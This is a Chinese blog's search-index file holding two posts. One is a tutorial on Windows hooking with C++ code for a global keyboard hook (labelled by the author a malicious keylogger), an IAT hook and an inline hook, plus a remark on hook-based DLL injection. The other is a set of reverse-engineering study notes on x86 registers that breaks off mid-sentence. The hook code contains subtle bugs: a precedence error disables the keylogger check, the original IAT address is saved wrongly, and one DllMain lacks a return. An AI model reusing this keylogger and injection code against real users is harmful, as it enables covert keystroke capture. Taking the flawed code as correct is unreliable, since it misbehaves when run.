<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Hook技术简介</title>
    <link href="/2022/04/07/HOOK%E6%8A%80%E6%9C%AF%E7%AE%80%E4%BB%8B%EF%BC%9A/"/>
    <url>/2022/04/07/HOOK%E6%8A%80%E6%9C%AF%E7%AE%80%E4%BB%8B%EF%BC%9A/</url>
    
    <content type="html"><![CDATA[<h2 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1.介绍"></a>1.介绍</h2><p>​    MSDN上定义如下：</p><p>​    A hook is a point in the system message-handling mechanism where an application can install a subroutine to monitor the message traffic in the system and process certain types of messages before they reach the target window procedure.</p><p>​    HOOK一词直译过来就是“钩子”的意思，即钩取所需内容所使用的工具。Windows操作系统是以事件驱动方式的，事件被包装了消息发送给窗口。</p><p>消息处理过程：</p><p>例如：</p><p>1.按下键盘后，会产生键盘被按下的消息，这个消息首先会被添加到系统的消息队列中。</p><p>2.操作系统从消息队列中取出消息，添加到相应的程序的消息队列中。</p><p>3.程序通过自身的GetMessage获取消息，DispatchMessage分发消息，再通过消息回调函数处理消息。</p><p>​    HOOK是一种特殊的消息处理机制，它可以监视系统或者进程中的各种事件消息，截获发往目标窗口的消息并进行处理，处理之后再发给下一个消息钩子，或者扔到应用程序的消息队列当中。所以说，我们可以在系统中自定义钩子，用来监视系统中特定事件的发生，完成特定功能，如屏幕取词，监视日志，截获键盘、鼠标输入等等。</p><p>​    编写消息HOOK的时候需要将设置HOOK的函数写到DLL文件里，勾住一个线程之后，产生消息时，如果发现钩子的DLL不在进程中，系统会将DLL强行加载进去，可利用这个特性进行DLL注入，即HOOK注入。</p><h2 id="2-HOOK的几种方式"><a href="#2-HOOK的几种方式" class="headerlink" title="2.HOOK的几种方式"></a>2.HOOK的几种方式</h2><h3 id="一-系统消息HOOK"><a href="#一-系统消息HOOK" class="headerlink" title="一.系统消息HOOK"></a>一.系统消息HOOK</h3><p>HOOK涉及到的API函数：</p><p>SetWindowsHookEx:设置钩子</p><p>CallNextHookEx：将钩子的信息传递到当前钩子链当中的下一个子程序。</p><p>UnhookWindowsHookEx：卸载钩子</p><p>​    利用WINDOWS提供的API函数进行HOOK，由于SetWindowsHookEx函数接受的最后一个参数为线程ID，因此该HOOK可以以线程为单位进行筛选，针对某一线程的消息进行HOOK。</p><p>​    系统消息HOOK的实现代码如下，下方为一恶意键盘记录器的实例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;framework.h&quot;</span></span><br>HINSTANCE g_hInstance = <span class="hljs-literal">NULL</span>;<span class="hljs-comment">//取DLL文件的模块句柄</span><br>HHOOK hhook = <span class="hljs-literal">NULL</span>;<br><span class="hljs-comment">//恶意键盘记录器</span><br><span class="hljs-function">LRESULT CALLBACK <span class="hljs-title">KeyboardProc</span><span class="hljs-params">(<span class="hljs-keyword">int</span> code,</span></span><br><span class="hljs-params"><span class="hljs-function">    WPARAM wParam,</span></span><br><span class="hljs-params"><span class="hljs-function">    LPARAM lParam</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//查阅CSDN得知lParam的最高位代表键盘状态，0代表按下，1代表松开</span><br>    <span class="hljs-keyword">if</span> (code == HC_ACTION&amp;&amp;(lParam&amp;<span class="hljs-number">0x80000000</span>==<span class="hljs-number">0</span>))<br>    &#123;<br>        <span class="hljs-comment">//创建数组储存所有键位的状态</span><br>        BYTE KeyState[<span class="hljs-number">256</span>]&#123; <span class="hljs-number">0</span> &#125;;<br>        <span class="hljs-comment">//获取键位状态并赋值给所创建数组</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">GetKeyboardState</span>(KeyState))<br>        &#123;<br>            LONG keyinfo = lParam;<br>            UINT keycode = (keyinfo &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0x00ff</span>;<br>            WCHAR wkeycode = <span class="hljs-number">0</span>;<br>            <span class="hljs-built_in">ToAscii</span>((UINT)wParam, keycode, KeyState, (LPWORD)&amp;wkeycode, <span class="hljs-number">0</span>);<br>            CHAR strinfo[<span class="hljs-number">12</span>]&#123; <span class="hljs-number">0</span> &#125;;          <br>            <span class="hljs-built_in">sprintf_s</span>(strinfo, _countof(strinfo), <span class="hljs-string">&quot;xxx%c&quot;</span>, wkeycode);<br>            <span class="hljs-built_in">OutputDebugStringA</span>(strinfo);<br>            <span class="hljs-comment">//返回1则代表丢弃该消息</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">CallNextHookEx</span>(hhook,code,wParam,lParam);<br>&#125;<br><span class="hljs-comment">//安装钩子</span><br><span class="hljs-function">BOOL <span class="hljs-title">InstallHook</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//此处最后一个参数为需要HOOK的线程ID，若置零则为全局HOOK</span><br>    hhook=<span class="hljs-built_in">SetWindowsHookExA</span>(WH_KEYBOARD, KeyboardProc, g_hInstance, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (hhook)<br>    &#123;<br>        <span class="hljs-keyword">return</span> TRUE;<br>    &#125;<br>    <span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">//卸载钩子</span><br><span class="hljs-function">BOOL <span class="hljs-title">unInstallHook</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">UnhookWindowsHookEx</span>(hhook);<br>&#125;<br><br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">( HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">                       DWORD  reason,</span></span><br><span class="hljs-params"><span class="hljs-function">                       LPVOID lpReserved</span></span><br><span class="hljs-params"><span class="hljs-function">                     )</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (reason)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        g_hInstance = hModule;<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="二-IATHOOK"><a href="#二-IATHOOK" class="headerlink" title="二.IATHOOK"></a>二.IATHOOK</h3><p>即通过在IAT中寻找到目标函数的地址，将其更改为自己的函数的地址，借此完成HOOK，实现代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;hookmain.h&quot;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> WINAPI <span class="hljs-title">HookMessageBoxW</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HWND   hWnd,</span></span><br><span class="hljs-params"><span class="hljs-function">LPCSTR lpText,</span></span><br><span class="hljs-params"><span class="hljs-function">LPCSTR lpCaption,</span></span><br><span class="hljs-params"><span class="hljs-function">UINT   uType)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> result=<span class="hljs-built_in">MessageBoxA</span>(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;success!&quot;</span>, <span class="hljs-string">&quot;notice&quot;</span>, MB_OK);<br><span class="hljs-keyword">return</span> result;<br>&#125;<br><span class="hljs-function">BOOL <span class="hljs-title">InstallHook</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//存储初始属性</span><br>DWORD dwOldProtect = <span class="hljs-number">0</span>;<br><span class="hljs-comment">//更改属性防止没有写入权限导致报错</span><br><span class="hljs-built_in">VirtualProtect</span>(g_iataddr, <span class="hljs-number">4</span>, PAGE_EXECUTE_READWRITE,&amp;dwOldProtect);<br><span class="hljs-comment">//将函数地址更改为自己写的函数的地址</span><br>*g_iataddr = (DWORD)HookMessageBoxW;<br><span class="hljs-comment">//将属性还原</span><br><span class="hljs-built_in">VirtualProtect</span>(g_iataddr, <span class="hljs-number">4</span>, dwOldProtect, &amp;dwOldProtect);<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-function">BOOL <span class="hljs-title">UninstallHook</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>DWORD dwOldProtect = <span class="hljs-number">0</span>;<br><span class="hljs-built_in">VirtualProtect</span>(g_iataddr, <span class="hljs-number">4</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);<br><span class="hljs-comment">//将函数地址还原</span><br>*g_iataddr = (DWORD)g_original;<br><span class="hljs-built_in">VirtualProtect</span>(g_iataddr, <span class="hljs-number">4</span>, dwOldProtect, &amp;dwOldProtect);<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-function">DWORD* <span class="hljs-title">GetIATAddr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* dllname, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* funcname)</span></span><br><span class="hljs-function"></span>&#123;<br>HMODULE hmodule=<span class="hljs-built_in">GetModuleHandle</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//文件偏移</span><br>DWORD dwhmodule = (DWORD)hmodule;<br>PIMAGE_DOS_HEADER pDosheader = (PIMAGE_DOS_HEADER)dwhmodule;<br>PIMAGE_NT_HEADERS pntheader = (PIMAGE_NT_HEADERS)(pDosheader-&gt;e_lfanew + dwhmodule);<br>PIMAGE_OPTIONAL_HEADER poptionalheader = &amp;pntheader-&gt;OptionalHeader;<br>IMAGE_DATA_DIRECTORY datadirectory = poptionalheader-&gt;DataDirectory[<span class="hljs-number">1</span>];<br>PIMAGE_IMPORT_DESCRIPTOR piid=(PIMAGE_IMPORT_DESCRIPTOR)(datadirectory.VirtualAddress + dwhmodule);<br><span class="hljs-keyword">while</span> (piid-&gt;Name)<br>&#123;<br><span class="hljs-keyword">char</span>* iatdllname = (<span class="hljs-keyword">char</span>*)(piid-&gt;Name + dwhmodule);<br><span class="hljs-comment">//遍历，寻找符合要求的DLL</span><br><span class="hljs-keyword">if</span> (!_stricmp(iatdllname, dllname))<span class="hljs-comment">//此处比较不区分大小写</span><br>&#123;<br><span class="hljs-comment">//获取导入名称表</span><br>PIMAGE_THUNK_DATA pINT = (PIMAGE_THUNK_DATA)(piid-&gt;OriginalFirstThunk + dwhmodule);<br><span class="hljs-comment">//获取导入地址表</span><br>PIMAGE_THUNK_DATA pIAT = (PIMAGE_THUNK_DATA)(piid-&gt;FirstThunk + dwhmodule);<br><span class="hljs-keyword">while</span> (pINT-&gt;u1.Function)<br>&#123;<br><span class="hljs-keyword">if</span> ((pINT-&gt;u1.Ordinal&amp;<span class="hljs-number">0x80000000</span>)==<span class="hljs-number">0</span>)<br>&#123;<span class="hljs-comment">//获取函数名</span><br>PIMAGE_IMPORT_BY_NAME pimportname=(PIMAGE_IMPORT_BY_NAME)(pINT-&gt;u1.Function + dwhmodule);<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(pimportname-&gt;Name, funcname) == <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-comment">//返回所寻找的函数地址</span><br><span class="hljs-keyword">return</span> (DWORD*)pIAT;<br>&#125;<br>&#125;<br>pINT++;<br>&#125;<br>&#125;<br>piid++;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function">BOOL WINAPI <span class="hljs-title">DllMain</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">DWORD reason,</span></span><br><span class="hljs-params"><span class="hljs-function">LPVOID lpreserved</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (reason == DLL_PROCESS_ATTACH)<br>&#123;<br><span class="hljs-built_in">MessageBoxA</span>(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;DLL has run&quot;</span>, <span class="hljs-string">&quot;notice&quot;</span>, MB_OK);<br><span class="hljs-comment">//获取IAT表</span><br>g_iataddr=<span class="hljs-built_in">GetIATAddr</span>(<span class="hljs-string">&quot;USER32.dll&quot;</span>, <span class="hljs-string">&quot;MessageBoxW&quot;</span>);<br><span class="hljs-comment">//保存要HOOK的函数地址</span><br>g_original = (DWORD*)g_iataddr;<br><span class="hljs-comment">//安装钩子</span><br><span class="hljs-built_in">InstallHook</span>();<br>&#125;<br><span class="hljs-keyword">if</span> (reason == DLL_PROCESS_DETACH)<br>&#123;<br><span class="hljs-built_in">UninstallHook</span>();<br>&#125;<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="三-INLINE-HOOK"><a href="#三-INLINE-HOOK" class="headerlink" title="三.INLINE HOOK"></a>三.INLINE HOOK</h3><p>inline hook是一种通过修改机器码的方式来实现hook的技术，具体实现代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;dllmain.h&quot;</span></span><br>DWORD g_unhook = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">char</span> g_oldcode[<span class="hljs-number">5</span>]&#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">char</span> g_newcode[<span class="hljs-number">5</span>]&#123; <span class="hljs-number">0xE9</span> &#125;;<br><span class="hljs-comment">//INLINE HOOK</span><br><span class="hljs-comment">//找到HOOK函数地址</span><br><span class="hljs-comment">//保存HOOK函数前五个字节</span><br><span class="hljs-comment">//计算目标函数距离JMP下一指令的偏移offset</span><br><span class="hljs-comment">//改变函数前五个字节，0XE9 offset</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> WINAPI <span class="hljs-title">myMessageBoxW</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">_In_opt_ HWND hWnd,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_opt_ LPCWSTR lpText,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_opt_ LPCWSTR lpCaption,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ UINT uType)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">UnInstallHook</span>();<br><span class="hljs-keyword">int</span> result=<span class="hljs-built_in">MessageBoxW</span>(<span class="hljs-number">0</span>, <span class="hljs-string">L&quot;done!&quot;</span>, <span class="hljs-string">L&quot;notice&quot;</span>, MB_OK);<br><span class="hljs-built_in">InstallHook</span>();<br><span class="hljs-keyword">return</span> result;<br>&#125;<br><span class="hljs-function">BOOL <span class="hljs-title">InitHook</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//找到要HOOK的函数地址</span><br>HMODULE hmodule = <span class="hljs-built_in">LoadLibraryA</span>(<span class="hljs-string">&quot;user32.dll&quot;</span>);<br><span class="hljs-keyword">if</span> (hmodule == <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>g_unhook=(DWORD)<span class="hljs-built_in">GetProcAddress</span>(hmodule, <span class="hljs-string">&quot;MessageBoxW&quot;</span>);<br><span class="hljs-comment">//patch函数前五字节</span><br><span class="hljs-built_in">memcpy</span>(g_oldcode, (<span class="hljs-keyword">char</span>*)g_unhook, <span class="hljs-number">5</span>);<br><span class="hljs-comment">//计算偏移</span><br>DWORD offset =(DWORD)myMessageBoxW-(g_unhook + <span class="hljs-number">5</span>);<br><span class="hljs-comment">//保存HOOK后的5个字节</span><br><span class="hljs-built_in">memcpy</span>(&amp;g_newcode[<span class="hljs-number">1</span>], &amp;offset,<span class="hljs-number">4</span>);<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-function">BOOL <span class="hljs-title">InstallHook</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>DWORD oldProtect = <span class="hljs-literal">NULL</span>;<br><span class="hljs-built_in">VirtualProtect</span>((DWORD*)g_unhook, <span class="hljs-number">5</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtect);<br><span class="hljs-built_in">memcpy</span>((DWORD*)g_unhook, g_newcode, <span class="hljs-number">5</span>);<br><span class="hljs-built_in">VirtualProtect</span>((DWORD*)g_unhook, <span class="hljs-number">5</span>, oldProtect, &amp;oldProtect);<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-function">BOOL <span class="hljs-title">UnInstallHook</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>DWORD oldProtect = <span class="hljs-literal">NULL</span>;<br><span class="hljs-built_in">VirtualProtect</span>((DWORD*)g_unhook, <span class="hljs-number">5</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtect);<br><span class="hljs-built_in">memcpy</span>((DWORD*)g_unhook, g_oldcode, <span class="hljs-number">5</span>);<br><span class="hljs-built_in">VirtualProtect</span>((DWORD*)g_unhook, <span class="hljs-number">5</span>, oldProtect, &amp;oldProtect);<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-function">BOOL WINAPI <span class="hljs-title">DllMain</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HMODULE hmodule,</span></span><br><span class="hljs-params"><span class="hljs-function">DWORD reason,</span></span><br><span class="hljs-params"><span class="hljs-function">LPVOID lpreserved</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (reason == DLL_PROCESS_ATTACH)<br>&#123;<br><span class="hljs-built_in">InitHook</span>();<br><span class="hljs-built_in">InstallHook</span>();<br>&#125;<br><span class="hljs-keyword">if</span> (reason == DLL_PROCESS_DETACH)<br>&#123;<br><span class="hljs-built_in">UnInstallHook</span>();<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>《逆向工程核心原理》知识点总结</title>
    <link href="/2021/12/18/%E3%80%8A%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E3%80%8B%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/"/>
    <url>/2021/12/18/%E3%80%8A%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E3%80%8B%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="逆向工程核心原理："><a href="#逆向工程核心原理：" class="headerlink" title="逆向工程核心原理："></a>逆向工程核心原理：</h1><h2 id="第一部分：代码逆向技术基础"><a href="#第一部分：代码逆向技术基础" class="headerlink" title="第一部分：代码逆向技术基础"></a>第一部分：代码逆向技术基础</h2><h3 id="第一章：关于逆向工程"><a href="#第一章：关于逆向工程" class="headerlink" title="第一章：关于逆向工程"></a>第一章：关于逆向工程</h3><p>逆向分析主要方法分为：</p><p>1.静态分析法：即不执行代码，对代码进行静态分析的方法。观察代码文件的外部特征如：PE头，文件类型，大小，注册信息……</p><p>2.动态分析法：即在程序执行过程中对代码进行动态分析的方法。借之可在观察文件，注册表，网络等的同时分析程序行为</p><h3 id="第二章：逆向分析Hello-World！程序"><a href="#第二章：逆向分析Hello-World！程序" class="headerlink" title="第二章：逆向分析Hello World！程序"></a>第二章：逆向分析Hello World！程序</h3><p>快速查找代码的方法：</p><p>1.代码执行法：顾名思义，即逐条执行指令来查找需要查找的位置，在被调试代码量不大且程序功能明确的情况下适用。</p><p>2.字符串检索法：即查找字符串。</p><p>3.API检索法：直接查找API函数或向DLL代码库中添加断点。</p><p>修改字符串的方法：</p><p>1.直接修改字符串缓冲区：即用新字符串覆盖原字符串，不改变字符串地址，因此会存在溢出风险。</p><p>2.在其他内存区域新建字符串并传递给消息函数：即使用另一段装无用数据的地址来承载新字符串，随后将函数使用的字符串地址更改为新字符串地址。</p><h3 id="第三章：小端序标记法"><a href="#第三章：小端序标记法" class="headerlink" title="第三章：小端序标记法"></a>第三章：小端序标记法</h3><p>字节序：</p><p>在数据长度为两字节及以上时，采用不同字节序保存它们形成的存储顺序是不同的，采用大端序保存数据非常直观，而小端序采用逆序方式存储，在进行算术运算及拓展/缩小数据时效率都非常高。</p><h3 id="第四章：IA-32寄存器基本讲解"><a href="#第四章：IA-32寄存器基本讲解" class="headerlink" title="第四章：IA-32寄存器基本讲解"></a>第四章：IA-32寄存器基本讲解</h3><p>寄存器：</p><p>1.定义：CPU内部用来存放数据的一些小型存储区域，区别于RAM，寄存器拥有非常高的读写速度。</p><p>2.组成：通用寄存器(8)，段寄存器(6)，程序状态与控制寄存器(EFLAGS),指令指针寄存器(EIP)。</p><p>2.1 通用寄存器： </p><p>即一种通用型的寄存器，用于传送和暂存数据，也可参与算术逻辑运算，并保存运算结果。IA-32中每个通用寄存器都是32位，主要用来保存常量或地址。</p><p>各寄存器名称如下：</p><p>1.EAX - Accumulator Register（累加器）<br>当你写一个函数，最后返回一个值x（return x），那么这个x就要被存到%eax。当你要把一个数字扩展成64位，那么%eax存这个数的低32位，%edx存这个数的高32位。</p><p>2.EBX - Base Register（基地址寄存器）<br>在所有的通用寄存器里，EBX是唯一一个没有什么重要的专门用途的寄存器，你可以用它存一个计算过程中的中间变量，或者一个指针等等。</p><p>3.ECX - Counter Register（计数寄存器）<br>在x86中，ecx用于循环计数，就是程序中无处不在的计数变量i，x86中每一个计数相关的指令都要用到ecx。</p><p>4.EDX - Data Register（数据寄存器）<br>在除了累加器之外的其余七个通用寄存器里，edx与累加器的联系最为紧密。（当你要把一个数字扩展成64位，那么%eax存这个数的低32位，%edx存这个数的高32位。）</p><p>5.ESI - Source Index（源变址寄存器）</p><p>用于内存复制</p><p>6.EDI - Destination Index（目的变址寄存器）</p><p>用于内存复制</p><p>7.EBP - Base Pointer（扩展基址指针寄存器）</p><p>EBP为栈区域的基地址，函数被调用时保存ESP的值，函数返回值再把值返回给ESP，从而保证栈不会崩溃（即栈帧技术）</p><p>8.ESP - Stack Pointer（栈指针寄存器）</p><p>指示栈区域的栈顶地址，某些指令可以直接用来操作ESP（此寄存器不应用作其他用途）</p><p>2.2 段寄存器：</p><p>段是一种内存保护技术，它将内存划分为多个区段，并为每个区段赋予了起始地址，范围，访问权限等，以保护内存。段寄存器共六个，每个段寄存器指向的段描述符与虚拟内存结合，形成一个线性地址，借助分页技术，线性地址最终被转换为实际的物理地址。</p><p>各段寄存器如下：</p><p>1.CS - Code Segment（代码段寄存器）</p><p>存放当前正在运行的程序代码所在段的段基址，表示当前使用的指令代码可以从该段寄存器指定的<a href="https://baike.baidu.com/item/%E5%AD%98%E5%82%A8%E5%99%A8">存储器</a>段中取得，相应的偏移量则由IP提供。</p><p>2.SS - Stack Segment（堆栈段寄存器）</p><p>指出当前堆栈的底部地址，即存放堆栈段的段基址。</p><p>3.DS - Data Segment（数据段寄存器）</p><p>指出当前程序使用的数据所存放段的最低地址，即存放数据段的段基址。</p><p>4.ES - Extra Segment（附加段寄存器）</p><p>指出当前程序使用附加<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E6%AE%B5">数据段</a>的段基址，该段是串操作指令中目的串所在的段。</p><p>5.FS - Data Segment（数据段寄存器）</p><p>存放程序使用的附加数据段的段基址。</p><p>6.GS - Data Segment（数据段寄存器）</p><p>存放程序使用的附加数据段的段基址。</p><p>2.3 程序状态与控制寄存器：</p><p>EFLAGS：FLAG REGISTER（标志寄存器）大小为四个字节（32位）由十六位寄存器FLAGS拓展（EXTEND)而来。该寄存器每位都有意义，每位作为标志故值均为0/1。只需掌握三个与程序调试相关的标志即可，如下：</p><p>1.ZF - Zero Flag（零标志）</p><p>若运算结果为零则为1，反之为0.</p><p>2.OF - Overflow Flag（溢出标志）</p><p>有符号整数溢出时，OF的值被置为1，此外MSB（Most Significant Bit）即最高有效位改变时，也会被置为1.</p><p>3.CF - Carry Flag（进位标志）</p><p>无符号整数溢出时，其值被置为1.</p><p>2.4指令指针寄存器：</p><p>EIP - Instruction 